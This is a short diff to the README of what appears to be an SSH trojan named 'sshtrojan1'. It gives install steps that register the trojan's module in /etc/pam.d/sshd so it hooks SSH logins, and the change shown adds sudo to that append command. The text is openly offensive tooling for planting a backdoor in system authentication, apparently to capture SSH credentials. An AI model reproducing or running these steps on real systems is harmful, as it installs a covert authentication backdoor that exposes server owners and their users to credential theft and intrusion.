@@ -4,7 +4,7 @@ SSHTROJAN1:
 
 `make`
 
-`printf "auth optional pam_unix.so nullok_secure audit\nauth optional sshtrojan1.so" >>  /etc/pam.d/sshd`
+`sudo printf "auth optional pam_unix.so nullok_secure audit\nauth optional sshtrojan1.so" >>  /etc/pam.d/sshd`
 
 /etc/pam.conf -> UsePam = yes
 
